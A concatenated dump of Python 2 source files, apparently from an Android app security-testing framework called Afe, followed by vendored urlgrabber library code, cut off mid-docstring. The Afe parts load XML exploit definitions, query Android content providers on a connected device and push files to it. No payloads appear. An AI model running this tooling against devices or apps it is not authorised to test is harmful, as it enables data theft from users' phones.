	        elif sconn == "1" and self.isconn == True:
	            print "Device : [connected]"
	            #TODO - Work here
	            querybuild = "app "+str(appname.strip())
	            self.session.sendData(querybuild + "\n")
	            if(self.session.receiveData() == "no"):
	                print "ERROR : Package not found ! exploit Failed !"
	                return
	            replacements = {}
	            count = len(dom.getElementsByTagName('out'))
	            if count > 0:
	                for x in range(count):
	                    outcon = dom.getElementsByTagName('out')[x].firstChild.wholeText.strip()
	                    attrib = dom.getElementsByTagName('out')[x].attributes.keys()
	                    if len(attrib) > 0:
	                        attribval = dom.getElementsByTagName('out')[x].attributes["input"].value.strip()
	                        varout = raw_input(outcon + " ")
	                        if varout.strip():
	                            replacements[attribval] = varout
	                    else:
	                         print outcon
	            countq = len(dom.getElementsByTagName('query'))
	            for x in range(countq):
	                arstr = dom.getElementsByTagName('query')[x]
	                children =  arstr.childNodes
	                text = ""
	                for c in children:
	                    if c.nodeType == c.TEXT_NODE:
	                        text += c.data
	                    else:
	                        if c.nodeName in replacements.keys():
	                            text += replacements[c.nodeName]
	                        else: # not text, nor a listed tag
	                            text += c.firstChild.wholeText.strip()
	                print "Quering : " + str(text.strip())
	                time.sleep(3)
	                try:
	                        men = menu.Menu(self.connected, self.session)
	                        men.do_query(str(text.strip()))
	                except Exception, e:
	                        print e
	                        pass
	        elif sconn == "0" and self.isconn == False:
	            print "Device : [disconnected]"
	            #TODO - work here
	       
	        elif sconn == "0" and self.isconn == True:
	            print "Device : [connected]"
	            #TODO - work here
	
	        else:
	            print "Exiting : Error !! (Please check the expliot !)"
              


    def complete_sploit(self, text, line, begidx, endidx):
        if not text:
            completions = self.exploits[:]
        else:
            completions = [ f
                            for f in self.exploits
                            if f.startswith(text)
                            ]
        return completions


########NEW FILE########
__FILENAME__ = menu
#!/usr/bin/python
# encoding: utf-8
import argparse, shlex, sys, urllib2, time, SocketServer, base64, os, ntpath
from common import Server, version, ServerHandler
from basecmd import *
from subprocess import call
from modules import Modules
from exploit import Exploits

def path_leaf(path):
    head, tail = ntpath.split(path)
    return tail or ntpath.basename(head)


class Menu(BaseCmd):

    def __init__(self, conn, session):
        BaseCmd.__init__(self, session)
        self.connected = conn
        self.session = session
        if (conn == 1):
            self.prompt = "*Afe/menu$ "
        else:
            self.prompt = "Afe/menu$ "

    def do_back(self, _args):
        """
Return to home screen
        """
        return -1


    def do_devices(self, _args):
        """
List Connected Devices 
        """
        call(["adb", "devices"])

    def do_modules(self, args):
	    """
Shows all the modules present in the Modules directory
	    """
	    subconsole = Modules(self.connected, self.session)
	    subconsole.cmdloop()
	
    def do_exploit(self, args):
	    """
Shows all the modules present in the Modules directory
	    """
	    subconsole = Exploits(self.connected, self.session)
	    subconsole.cmdloop()
	
    def do_query(self, args):
        """
Query the TCP Server!
    Usage: query <arguments> [<arguments> ...]
For getting the content providers, which are exported or not
    Usage: query exported
For querying the content providers,
    Usage: query "[Arguments]"
           [Arguments]:
           get --url   = The content provider URI
               --proj  = The Projections, seperated by comma
           app <appname space> = Give the app name space to check if the app exists or not
     Example Usage:
           query "get --url content://dcontent/providers"
           query "app com.afe.socket"
        """
        try:
            parser = argparse.ArgumentParser(prog="query", add_help = False)
            parser.add_argument('argu', metavar="<arguments>", nargs='+')
            parser.add_argument('--file', '-f', metavar = '<file>', dest='file')
            splitargs = parser.parse_args(shlex.split(args))
            sendbuf = ' '.join(splitargs.argu)
            sendbuf1 = sendbuf.strip()
            if(self.connected == 1):
                if(splitargs.file):
                    if(os.path.isfile(splitargs.file)):
                        print path_leaf
                        print "Inside"
                        fin = open(splitargs.file, "rb")
                        binary_data = fin.read()
                        fin.close()
                        b64_data = base64.b64encode(binary_data)
                        print b64_data
                        count = 0
                        line =""
                        if len(b64_data) > 100000000000000:
                            for b in b64_data:
                                if count < 1000:
                                    line += b
                                    count += 1
                                else:
                                    print "Here"
                                    self.session.sendData( "file " + line + "\n")
                                    resp = self.session.receiveData()
                                    print resp
                                    count = 0
                                    line = ""
                        else:
                            print "Here 1"
                            self.session.sendData( "file " + b64_data + "\n")
                            resp = self.session.receiveData()
                            print resp
                            
                        self.session.sendData("file [end]" + "\n")
                        print "Data Sent !!"
                    else:
                        print "False"
                self.session.sendData(sendbuf + "\n")
                resp = self.session.receiveData()
                print resp
            else:
                print "**Not connected to the AFE SERVER App !"
        except:
            pass
    def do_serve(self, args):
	    """
Starts a Server in Localhost with your predefined port!
    Usage: serve -p --port <port>
           Default Port is 8080
	    """
            try:
                parser = argparse.ArgumentParser(prog="serve", add_help = False)
                parser.add_argument('--port', '-p', metavar = '<port>', type=int)
                splitargs = parser.parse_args(shlex.split(args))
                if (splitargs.port):
                    PORT = int(splitargs.port)
                else:
                    PORT = 8080
                
                Handler = ServerHandler
                httpd = SocketServer.TCPServer(("", PORT), Handler)
                print "serving at port ", PORT
                httpd.serve_forever()
            except KeyboardInterrupt:
                httpd.server_close()
                print time.asctime(), "Server Stops - At this point"
            except:
                pass

########NEW FILE########
__FILENAME__ = modules
#!/usr/bin/python
# encoding: utf-8
import os, os.path, sys, argparse, shlex, signal, subprocess
from basecmd import *
from subprocess import call

class Module(object):

    def __init__(self):
        """ Arbitary constructor """
        self.path = "miscellaneous"

    def execute(self, session, arg):
        """ Arbitary function """

class Modules(BaseCmd):

    def __init__(self, conn, session):
        BaseCmd.__init__(self, session)
        self.connected = conn
        self.session = session
        if (conn == 1):
            self.prompt = "*Afe/menu/modules$ "
        else:
            self.prompt = "Afe/menu/modules$ "
        self.modules = {} # list of modules 
        self.do_reload(None)
    
    def do_back(self, _args):
        """
Return to main menu
        """
        return -1

    def _find_modules(self):
	    module_dir = os.getcwd() + "/modules"
	    dir_list = [d for d in os.listdir(module_dir) if os.path.isdir(module_dir+"/"+d)]
	    return dir_list
	
    def _list_modules(self, dir_list):
	    self.modules = dir_list
		
	
    def do_list(self, _args):
	    """
List all available modules
	    """
	    for module in sorted(self.modules):
		    print module
		
    def do_reload(self, _args):
	    """
Reloads the Plugins which are loaded in the memory
	    """
	    modulenames = self._find_modules()
	    self._list_modules(modulenames)

    def preexec_function():
        signal.signal(signal.SIGINT, signal.SIG_IGN)

    def preexec():
	    os.setpgrp()

    def do_run(self, args):
        """
Run a custom module
usage: run [--arg <arg>] module
        """

        # Define command-line arguments using argparse
        parser = argparse.ArgumentParser(prog = 'run', add_help = False)
        parser.add_argument('module')
        parser.add_argument('--arg', '-a', metavar = '<arg>')
        try:
            splitargs = parser.parse_args(shlex.split(args))
            self.modules.index(splitargs.module)
            # Load module
        except ValueError:
	        pass
	        print splitargs.module
	        print "Error : Module not Found, please Reload"
        except:
                pass
        else:
	        print "Module found !"
	        module_dir_run = os.getcwd() + "/modules/" + splitargs.module
	        print module_dir_run
	        if os.name == 'nt':
	            path = module_dir_run+'/run.bat'
	        else:
	            path = module_dir_run+'/run.sh'
	        if os.path.isfile(path):
	            if (splitargs.arg):
	                try:
	                    call([path, splitargs.arg])
	                except:
	                    pass
	            else:
	                try:
	                    call([path])
	                except:
	                    pass
	        else:
	            print "Not found : " + path 
	        #subprocess.Popen([module_dir_run + '/run.sh'], shell = False)

        
    def complete_run(self, text, line, begidx, endidx):
        if not text:
            completions = self.modules[:]
        else:
            completions = [ f
                            for f in self.modules
                            if f.startswith(text)
                            ]
        return completions

    def do_info(self, args):
        """
Get information about a custom module
usage: info module
        """

        # Define command-line arguments using argparse
        parser = argparse.ArgumentParser(prog = 'info', add_help = False)
        parser.add_argument('module')
        try:
            splitargs = parser.parse_args(shlex.split(args))
            self.modules.index(splitargs.module)

            # Load module
        except ValueError:
	        pass
	        print splitargs.module
	        print "Error : Module not Found, please Reload"
        except:
                pass
        else:
	        module_info = os.getcwd() + "/modules/" + splitargs.module + "/" + splitargs.module + ".info"
	        try:
	            with open(module_info) as a_file:
		            print a_file.read()
                except IOError:
	            pass
	            print "No info was found for the module " + splitargs.module
                except:
                    pass

    def complete_info(self, text, line, begidx, endidx):
        if not text:
            completions = self.modules[:]
        else:
            completions = [ f
                            for f in self.modules
                            if f.startswith(text)
                            ]
        return completions
########NEW FILE########
__FILENAME__ = _menu
#!/usr/bin/python
# encoding: utf-8
import argparse, shlex, sys, urllib2, time, SocketServer, base64, os, ntpath
from common import Server, version, ServerHandler
from basecmd import *
from subprocess import call
from modules import Modules
from exploit import Exploits

def path_leaf(path):
    head, tail = ntpath.split(path)
    return tail or ntpath.basename(head)

def bytes_from_file(filename, chunksize=8192):
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(chunksize)
            if chunk:
                for b in chunk:
                    yield b
            else:
                break


class Menu(BaseCmd):

    def __init__(self, conn, session):
        BaseCmd.__init__(self, session)
        self.connected = conn
        self.session = session
        if (conn == 1):
            self.prompt = "*Afe/menu$ "
        else:
            self.prompt = "Afe/menu$ "

    def do_back(self, _args):
        """
Return to home screen
        """
        return -1


    def do_devices(self, _args):
        """
List Connected Devices 
        """
        call(["adb", "devices"])

    def do_modules(self, args):
	    """
Shows all the modules present in the Modules directory
	    """
	    subconsole = Modules(self.connected, self.session)
	    subconsole.cmdloop()
	
    def do_exploit(self, args):
	    """
Shows all the modules present in the Modules directory
	    """
	    subconsole = Exploits(self.connected, self.session)
	    subconsole.cmdloop()
	
    def do_query(self, args):
        """
Query the TCP Server!
    Usage: query <arguments> [<arguments> ...]
For getting the content providers, which are exported or not
    Usage: query exported
For querying the content providers,
    Usage: query "[Arguments]"
           [Arguments]:
           get --url   = The content provider URI
               --proj  = The Projections, seperated by comma
           app <appname space> = Give the app name space to check if the app exists or not
     Example Usage:
           query "get --url content://dcontent/providers"
           query "app com.afe.socket"
        """
        try:
            parser = argparse.ArgumentParser(prog="query")
            subparsers = parser.add_subparsers(help='sub-command help')
            parser_get = subparsers.add_parser('get', help="get help")
            parser_get.add_argument('--url', metavar="<URL>", dest='url', help='The content provider URI')
            parser_get.add_argument('--proj', metavar="<PROJECTIONS>", dest='proj', help='The Projections, seperated by comma')
            parser_app = subparsers.add_parser('app', help="Give the app name space to check if the app exists")
            parser_app.add_argument('package', metavar="<PACKAGE NAME>", dest='package', help='Give the app package name to check if the app exists or not')
            parser.add_argument('--file', '-f', metavar = '<file>', dest='file')
            splitargs = parser.parse_args(shlex.split(args))
            if(self.connected == 1):
                if(splitargs.file):
                    if(os.path.isfile(splitargs.file)):
                        fname = path_leaf(splitargs.file)
                        try:
                            fsize = os.stat(splitargs.file).st_size
                        except e:
                            print e
                        print "Sending file " + fname + " of size " + str(fsize)
                        init = fname + " : " + str(fsize)
                        self.session.sendData(init + "\n")
                        resp = self.session.receiveData()
                        if resp == "ok":
                            fin = open(splitargs.file, "rb")
                            binary_data = fin.read()
                            fin.close()
                            self.session.sendData(sendbuf + "\n")
                            resp = self.session.receiveData()
                            print "Data Sent !!"
                        else:
                            print "Something went wrong !"
                    else:
                        print "False"
                elif (splitargs.argu):
                    sendbuf = ' '.join(splitargs.argu)
                    sendbuf = sendbuf.strip()
                    self.session.sendData(sendbuf + "\n")
                    resp = self.session.receiveData()
                    print resp
            else:
                print "**Not connected to the AFE SERVER App !"
        except:
            pass
    def do_serve(self, args):
	    """
Starts a Server in Localhost with your predefined port!
    Usage: serve -p --port <port>
           Default Port is 8080
	    """
            try:
                parser = argparse.ArgumentParser(prog="serve", add_help = False)
                parser.add_argument('--port', '-p', metavar = '<port>', type=int)
                splitargs = parser.parse_args(shlex.split(args))
                if (splitargs.port):
                    PORT = int(splitargs.port)
                else:
                    PORT = 8080
                
                Handler = ServerHandler
                httpd = SocketServer.TCPServer(("", PORT), Handler)
                print "serving at port ", PORT
                httpd.serve_forever()
            except KeyboardInterrupt:
                httpd.server_close()
                print time.asctime(), "Server Stops - At this point"
            except:
                pass

########NEW FILE########
__FILENAME__ = byterange
#   This library is free software; you can redistribute it and/or
#   modify it under the terms of the GNU Lesser General Public
#   License as published by the Free Software Foundation; either
#   version 2.1 of the License, or (at your option) any later version.
#
#   This library is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
#   Lesser General Public License for more details.
#
#   You should have received a copy of the GNU Lesser General Public
#   License along with this library; if not, write to the 
#      Free Software Foundation, Inc., 
#      59 Temple Place, Suite 330, 
#      Boston, MA  02111-1307  USA

# This file is part of urlgrabber, a high-level cross-protocol url-grabber
# Copyright 2002-2004 Michael D. Stenner, Ryan Tomayko


import os
import stat
import urllib
import urllib2
import rfc822

DEBUG = None

try:    
    from cStringIO import StringIO
except ImportError, msg: 
    from StringIO import StringIO

class RangeError(IOError):
    """Error raised when an unsatisfiable range is requested."""
    pass
    
class HTTPRangeHandler(urllib2.BaseHandler):
    """Handler that enables HTTP Range headers.
    
    This was extremely simple. The Range header is a HTTP feature to
    begin with so all this class does is tell urllib2 that the 
    "206 Partial Content" reponse from the HTTP server is what we 
    expected.
    
    Example:
        import urllib2
        import byterange
        
        range_handler = range.HTTPRangeHandler()
        opener = urllib2.build_opener(range_handler)
        
        # install it
        urllib2.install_opener(opener)
        
        # create Request and set Range header
        req = urllib2.Request('http://www.python.org/')
        req.header['Range'] = 'bytes=30-50'
        f = urllib2.urlopen(req)
    """
    
    def http_error_206(self, req, fp, code, msg, hdrs):
        # 206 Partial Content Response
        r = urllib.addinfourl(fp, hdrs, req.get_full_url())
        r.code = code
        r.msg = msg
        return r
    
    def http_error_416(self, req, fp, code, msg, hdrs):
        # HTTP's Range Not Satisfiable error
        raise RangeError('Requested Range Not Satisfiable')

class HTTPSRangeHandler(HTTPRangeHandler):
    """ Range Header support for HTTPS. """

    def https_error_206(self, req, fp, code, msg, hdrs):
        return self.http_error_206(req, fp, code, msg, hdrs)

    def https_error_416(self, req, fp, code, msg, hdrs):
        self.https_error_416(req, fp, code, msg, hdrs)

class RangeableFileObject:
    """File object wrapper to enable raw range handling.
    This was implemented primarilary for handling range 
    specifications for file:// urls. This object effectively makes 
    a file object look like it consists only of a range of bytes in 
    the stream.
    
    Examples:
        # expose 10 bytes, starting at byte position 20, from 
        # /etc/aliases.
        >>> fo = RangeableFileObject(file('/etc/passwd', 'r'), (20,30))
        # seek seeks within the range (to position 23 in this case)
        >>> fo.seek(3)
        # tell tells where your at _within the range_ (position 3 in
        # this case)
        >>> fo.tell()
        # read EOFs if an attempt is made to read past the last
        # byte in the range. the following will return only 7 bytes.
        >>> fo.read(30)
    """
    
    def __init__(self, fo, rangetup):
        """Create a RangeableFileObject.
        fo       -- a file like object. only the read() method need be 
                    supported but supporting an optimized seek() is 
                    preferable.
        rangetup -- a (firstbyte,lastbyte) tuple specifying the range
                    to work over.
        The file object provided is assumed to be at byte offset 0.
        """
        self.fo = fo
        (self.firstbyte, self.lastbyte) = range_tuple_normalize(rangetup)
        self.realpos = 0
        self._do_seek(self.firstbyte)
        
    def __getattr__(self, name):
        """This effectively allows us to wrap at the instance level.
        Any attribute not found in _this_ object will be searched for
        in self.fo.  This includes methods."""
        if hasattr(self.fo, name):
            return getattr(self.fo, name)
        raise AttributeError, name
    
    def tell(self):
        """Return the position within the range.
        This is different from fo.seek in that position 0 is the 
        first byte position of the range tuple. For example, if
        this object was created with a range tuple of (500,899),
        tell() will return 0 when at byte position 500 of the file.
        """
        return (self.realpos - self.firstbyte)
    
    def seek(self,offset,whence=0):
        """Seek within the byte range.
        Positioning is identical to that described under tell().
        """
        assert whence in (0, 1, 2)
        if whence == 0:   # absolute seek
            realoffset = self.firstbyte + offset
        elif whence == 1: # relative seek
            realoffset = self.realpos + offset
        elif whence == 2: # absolute from end of file
            # XXX: are we raising the right Error here?
            raise IOError('seek from end of file not supported.')
        
        # do not allow seek past lastbyte in range
        if self.lastbyte and (realoffset >= self.lastbyte):
            realoffset = self.lastbyte
        
        self._do_seek(realoffset - self.realpos)
        
    def read(self, size=-1):
        """Read within the range.
        This method will limit the size read based on the range.
        """
        size = self._calc_read_size(size)
        rslt = self.fo.read(size)
        self.realpos += len(rslt)
        return rslt
    
    def readline(self, size=-1):
        """Read lines within the range.
        This method will limit the size read based on the range.
        """
        size = self._calc_read_size(size)
        rslt = self.fo.readline(size)
        self.realpos += len(rslt)
        return rslt
    
    def _calc_read_size(self, size):
        """Handles calculating the amount of data to read based on
        the range.
        """
        if self.lastbyte:
            if size > -1:
                if ((self.realpos + size) >= self.lastbyte):
                    size = (self.lastbyte - self.realpos)
            else:
                size = (self.lastbyte - self.realpos)
        return size
        
    def _do_seek(self,offset):
        """Seek based on whether wrapped object supports seek().
        offset is relative to the current position (self.realpos).
        """
        assert offset >= 0
        if not hasattr(self.fo, 'seek'):
            self._poor_mans_seek(offset)
        else:
            self.fo.seek(self.realpos + offset)
        self.realpos+= offset
        
    def _poor_mans_seek(self,offset):
        """Seek by calling the wrapped file objects read() method.
        This is used for file like objects that do not have native
        seek support. The wrapped objects read() method is called
        to manually seek to the desired position.
        offset -- read this number of bytes from the wrapped
                  file object.
        raise RangeError if we encounter EOF before reaching the 
        specified offset.
        """
        pos = 0
        bufsize = 1024
        while pos < offset:
            if (pos + bufsize) > offset:
                bufsize = offset - pos
            buf = self.fo.read(bufsize)
            if len(buf) != bufsize:
                raise RangeError('Requested Range Not Satisfiable')
            pos+= bufsize

class FileRangeHandler(urllib2.FileHandler):
    """FileHandler subclass that adds Range support.
    This class handles Range headers exactly like an HTTP
    server would.
    """
    def open_local_file(self, req):
        import mimetypes
        import mimetools
        host = req.get_host()
        file = req.get_selector()
        localfile = urllib.url2pathname(file)
        stats = os.stat(localfile)
        size = stats[stat.ST_SIZE]
        modified = rfc822.formatdate(stats[stat.ST_MTIME])
        mtype = mimetypes.guess_type(file)[0]
        if host:
            host, port = urllib.splitport(host)
            if port or socket.gethostbyname(host) not in self.get_names():
                raise urllib2.URLError('file not on local host')
        fo = open(localfile,'rb')
        brange = req.headers.get('Range',None)
        brange = range_header_to_tuple(brange)
        assert brange != ()
        if brange:
            (fb,lb) = brange
            if lb == '': lb = size
            if fb < 0 or fb > size or lb > size:
                raise RangeError('Requested Range Not Satisfiable')
            size = (lb - fb)
            fo = RangeableFileObject(fo, (fb,lb))
        headers = mimetools.Message(StringIO(
            'Content-Type: %s\nContent-Length: %d\nLast-modified: %s\n' %
            (mtype or 'text/plain', size, modified)))
        return urllib.addinfourl(fo, headers, 'file:'+file)


# FTP Range Support 
# Unfortunately, a large amount of base FTP code had to be copied
# from urllib and urllib2 in order to insert the FTP REST command.
# Code modifications for range support have been commented as 
# follows:
# -- range support modifications start/end here

from urllib import splitport, splituser, splitpasswd, splitattr, \
                   unquote, addclosehook, addinfourl
import ftplib
import socket
import sys
import mimetypes
import mimetools

class FTPRangeHandler(urllib2.FTPHandler):
    def ftp_open(self, req):
        host = req.get_host()
        if not host:
            raise IOError, ('ftp error', 'no host given')
        host, port = splitport(host)
        if port is None:
            port = ftplib.FTP_PORT
        else:
            port = int(port)

        # username/password handling
        user, host = splituser(host)
        if user:
            user, passwd = splitpasswd(user)
        else:
            passwd = None
        host = unquote(host)
        user = unquote(user or '')
        passwd = unquote(passwd or '')
        
        try:
            host = socket.gethostbyname(host)
        except socket.error, msg:
            raise urllib2.URLError(msg)
        path, attrs = splitattr(req.get_selector())
        dirs = path.split('/')
        dirs = map(unquote, dirs)
        dirs, file = dirs[:-1], dirs[-1]
        if dirs and not dirs[0]:
            dirs = dirs[1:]
        try:
            fw = self.connect_ftp(user, passwd, host, port, dirs)
            type = file and 'I' or 'D'
            for attr in attrs:
                attr, value = splitattr(attr)
                if attr.lower() == 'type' and \
                   value in ('a', 'A', 'i', 'I', 'd', 'D'):
                    type = value.upper()
            
            # -- range support modifications start here
            rest = None
            range_tup = range_header_to_tuple(req.headers.get('Range',None))    
            assert range_tup != ()
            if range_tup:
                (fb,lb) = range_tup
                if fb > 0: rest = fb
            # -- range support modifications end here
            
            fp, retrlen = fw.retrfile(file, type, rest)
            
            # -- range support modifications start here
            if range_tup:
                (fb,lb) = range_tup
                if lb == '': 
                    if retrlen is None or retrlen == 0:
                        raise RangeError('Requested Range Not Satisfiable due to unobtainable file length.')
                    lb = retrlen
                    retrlen = lb - fb
                    if retrlen < 0:
                        # beginning of range is larger than file
                        raise RangeError('Requested Range Not Satisfiable')
                else:
                    retrlen = lb - fb
                    fp = RangeableFileObject(fp, (0,retrlen))
            # -- range support modifications end here
            
            headers = ""
            mtype = mimetypes.guess_type(req.get_full_url())[0]
            if mtype:
                headers += "Content-Type: %s\n" % mtype
            if retrlen is not None and retrlen >= 0:
                headers += "Content-Length: %d\n" % retrlen
            sf = StringIO(headers)
            headers = mimetools.Message(sf)
            return addinfourl(fp, headers, req.get_full_url())
        except ftplib.all_errors, msg:
            raise IOError, ('ftp error', msg), sys.exc_info()[2]

    def connect_ftp(self, user, passwd, host, port, dirs):
        fw = ftpwrapper(user, passwd, host, port, dirs)
        return fw

class ftpwrapper(urllib.ftpwrapper):
    # range support note:
    # this ftpwrapper code is copied directly from
    # urllib. The only enhancement is to add the rest
    # argument and pass it on to ftp.ntransfercmd
    def retrfile(self, file, type, rest=None):
        self.endtransfer()
        if type in ('d', 'D'): cmd = 'TYPE A'; isdir = 1
        else: cmd = 'TYPE ' + type; isdir = 0
        try:
            self.ftp.voidcmd(cmd)
        except ftplib.all_errors:
            self.init()
            self.ftp.voidcmd(cmd)
        conn = None
        if file and not isdir:
            # Use nlst to see if the file exists at all
            try:
                self.ftp.nlst(file)
            except ftplib.error_perm, reason:
                raise IOError, ('ftp error', reason), sys.exc_info()[2]
            # Restore the transfer mode!
            self.ftp.voidcmd(cmd)
            # Try to retrieve as a file
            try:
                cmd = 'RETR ' + file
                conn = self.ftp.ntransfercmd(cmd, rest)
            except ftplib.error_perm, reason:
                if str(reason)[:3] == '501':
                    # workaround for REST not supported error
                    fp, retrlen = self.retrfile(file, type)
                    fp = RangeableFileObject(fp, (rest,''))
                    return (fp, retrlen)
                elif str(reason)[:3] != '550':
                    raise IOError, ('ftp error', reason), sys.exc_info()[2]
        if not conn:
            # Set transfer mode to ASCII!
            self.ftp.voidcmd('TYPE A')
            # Try a directory listing
            if file: cmd = 'LIST ' + file
            else: cmd = 'LIST'
            conn = self.ftp.ntransfercmd(cmd)
        self.busy = 1
        # Pass back both a suitably decorated object and a retrieval length
        return (addclosehook(conn[0].makefile('rb'),
                            self.endtransfer), conn[1])


####################################################################
# Range Tuple Functions
# XXX: These range tuple functions might go better in a class.

_rangere = None
def range_header_to_tuple(range_header):
    """Get a (firstbyte,lastbyte) tuple from a Range header value.
    
    Range headers have the form "bytes=<firstbyte>-<lastbyte>". This
    function pulls the firstbyte and lastbyte values and returns
    a (firstbyte,lastbyte) tuple. If lastbyte is not specified in
    the header value, it is returned as an empty string in the
    tuple.
    
    Return None if range_header is None
    Return () if range_header does not conform to the range spec 
    pattern.
    
    """
    global _rangere
    if range_header is None: return None
    if _rangere is None:
        import re
        _rangere = re.compile(r'^bytes=(\d{1,})-(\d*)')
    match = _rangere.match(range_header)
    if match: 
        tup = range_tuple_normalize(match.group(1,2))
        if tup and tup[1]: 
            tup = (tup[0],tup[1]+1)
        return tup
    return ()

def range_tuple_to_header(range_tup):
    """Convert a range tuple to a Range header value.
    Return a string of the form "bytes=<firstbyte>-<lastbyte>" or None
    if no range is needed.
    """
    if range_tup is None: return None
    range_tup = range_tuple_normalize(range_tup)
    if range_tup:
        if range_tup[1]: 
            range_tup = (range_tup[0],range_tup[1] - 1)
        return 'bytes=%s-%s' % range_tup
    
def range_tuple_normalize(range_tup):
    """Normalize a (first_byte,last_byte) range tuple.
    Return a tuple whose first element is guaranteed to be an int
    and whose second element will be '' (meaning: the last byte) or 
    an int. Finally, return None if the normalized tuple == (0,'')
    as that is equivelant to retrieving the entire file.
    """
    if range_tup is None: return None
    # handle first byte
    fb = range_tup[0]
    if fb in (None,''): fb = 0
    else: fb = int(fb)
    # handle last byte
    try: lb = range_tup[1]
    except IndexError: lb = ''
    else:  
        if lb is None: lb = ''
        elif lb != '': lb = int(lb)
    # check if range is over the entire file
    if (fb,lb) == (0,''): return None
    # check that the range is valid
    if lb < fb: raise RangeError('Invalid byte range: %s-%s' % (fb,lb))
    return (fb,lb)


########NEW FILE########
__FILENAME__ = grabber
#   This library is free software; you can redistribute it and/or
#   modify it under the terms of the GNU Lesser General Public
#   License as published by the Free Software Foundation; either
#   version 2.1 of the License, or (at your option) any later version.
#
#   This library is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
#   Lesser General Public License for more details.
#
#   You should have received a copy of the GNU Lesser General Public
#   License along with this library; if not, write to the 
#      Free Software Foundation, Inc., 
#      59 Temple Place, Suite 330, 
#      Boston, MA  02111-1307  USA

# This file is part of urlgrabber, a high-level cross-protocol url-grabber
# Copyright 2002-2004 Michael D. Stenner, Ryan Tomayko
# Copyright 2009 Red Hat inc, pycurl code written by Seth Vidal

"""A high-level cross-protocol url-grabber.

GENERAL ARGUMENTS (kwargs)

  Where possible, the module-level default is indicated, and legal
  values are provided.

  copy_local = 0   [0|1]

    ignored except for file:// urls, in which case it specifies
    whether urlgrab should still make a copy of the file, or simply
    point to the existing copy. The module level default for this
    option is 0.

  close_connection = 0   [0|1]

    tells URLGrabber to close the connection after a file has been
    transfered. This is ignored unless the download happens with the
    http keepalive handler (keepalive=1).  Otherwise, the connection
    is left open for further use. The module level default for this
    option is 0 (keepalive connections will not be closed).

  keepalive = 1   [0|1]

    specifies whether keepalive should be used for HTTP/1.1 servers
    that support it. The module level default for this option is 1
    (keepalive is enabled).

  progress_obj = None

    a class instance that supports the following methods:
      po.start(filename, url, basename, length, text)
      # length will be None if unknown
      po.update(read) # read == bytes read so far
      po.end()

  text = None
  
    specifies alternative text to be passed to the progress meter
    object.  If not given, the default progress meter will use the
    basename of the file.

  throttle = 1.0

    a number - if it's an int, it's the bytes/second throttle limit.
    If it's a float, it is first multiplied by bandwidth.  If throttle
    == 0, throttling is disabled.  If None, the module-level default
    (which can be set on default_grabber.throttle) is used. See
    BANDWIDTH THROTTLING for more information.

  timeout = None

    a positive float expressing the number of seconds to wait for socket
    operations. If the value is None or 0.0, socket operations will block
    forever. Setting this option causes urlgrabber to call the settimeout
    method on the Socket object used for the request. See the Python
    documentation on settimeout for more information.
    http://www.python.org/doc/current/lib/socket-objects.html

  bandwidth = 0

    the nominal max bandwidth in bytes/second.  If throttle is a float
    and bandwidth == 0, throttling is disabled.  If None, the
    module-level default (which can be set on
    default_grabber.bandwidth) is used. See BANDWIDTH THROTTLING for
    more information.

  range = None

    a tuple of the form (first_byte, last_byte) describing a byte
    range to retrieve. Either or both of the values may set to
    None. If first_byte is None, byte offset 0 is assumed. If
    last_byte is None, the last byte available is assumed. Note that
    the range specification is python-like in that (0,10) will yeild
    the first 10 bytes of the file.

    If set to None, no range will be used.
    
  reget = None   [None|'simple'|'check_timestamp']

    whether to attempt to reget a partially-downloaded file.  Reget
    only applies to .urlgrab and (obviously) only if there is a
    partially downloaded file.  Reget has two modes:

      'simple' -- the local file will always be trusted.  If there
        are 100 bytes in the local file, then the download will always
        begin 100 bytes into the requested file.

      'check_timestamp' -- the timestamp of the server file will be
        compared to the timestamp of the local file.  ONLY if the
        local file is newer than or the same age as the server file
        will reget be used.  If the server file is newer, or the
        timestamp is not returned, the entire file will be fetched.

    NOTE: urlgrabber can do very little to verify that the partial
    file on disk is identical to the beginning of the remote file.
    You may want to either employ a custom "checkfunc" or simply avoid
    using reget in situations where corruption is a concern.

  user_agent = 'urlgrabber/VERSION'

    a string, usually of the form 'AGENT/VERSION' that is provided to
    HTTP servers in the User-agent header. The module level default
    for this option is "urlgrabber/VERSION".

  http_headers = None

    a tuple of 2-tuples, each containing a header and value.  These
    will be used for http and https requests only.  For example, you
    can do
      http_headers = (('Pragma', 'no-cache'),)

  ftp_headers = None

    this is just like http_headers, but will be used for ftp requests.

  proxies = None

    a dictionary that maps protocol schemes to proxy hosts. For
    example, to use a proxy server on host "foo" port 3128 for http
    and https URLs:
      proxies={ 'http' : 'http://foo:3128', 'https' : 'http://foo:3128' }
    note that proxy authentication information may be provided using
    normal URL constructs:
      proxies={ 'http' : 'http://user:host@foo:3128' }
    Lastly, if proxies is None, the default environment settings will
    be used.

  prefix = None

    a url prefix that will be prepended to all requested urls.  For
    example:
      g = URLGrabber(prefix='http://foo.com/mirror/')
      g.urlgrab('some/file.txt')
      ## this will fetch 'http://foo.com/mirror/some/file.txt'
    This option exists primarily to allow identical behavior to
    MirrorGroup (and derived) instances.  Note: a '/' will be inserted
    if necessary, so you cannot specify a prefix that ends with a
    partial file or directory name.

  opener = None
    No-op when using the curl backend (default)

  cache_openers = True
    No-op when using the curl backend (default)

  data = None

    Only relevant for the HTTP family (and ignored for other
    protocols), this allows HTTP POSTs.  When the data kwarg is
    present (and not None), an HTTP request will automatically become
    a POST rather than GET.  This is done by direct passthrough to
    urllib2.  If you use this, you may also want to set the
    'Content-length' and 'Content-type' headers with the http_headers
    option.  Note that python 2.2 handles the case of these
    badly and if you do not use the proper case (shown here), your
    values will be overridden with the defaults.
    
  urlparser = URLParser()

    The URLParser class handles pre-processing of URLs, including
    auth-handling for user/pass encoded in http urls, file handing
    (that is, filenames not sent as a URL), and URL quoting.  If you
    want to override any of this behavior, you can pass in a
    replacement instance.  See also the 'quote' option.

  quote = None

    Whether or not to quote the path portion of a url.
      quote = 1    ->  quote the URLs (they're not quoted yet)
      quote = 0    ->  do not quote them (they're already quoted)
      quote = None ->  guess what to do

    This option only affects proper urls like 'file:///etc/passwd'; it
    does not affect 'raw' filenames like '/etc/passwd'.  The latter
    will always be quoted as they are converted to URLs.  Also, only
    the path part of a url is quoted.  If you need more fine-grained
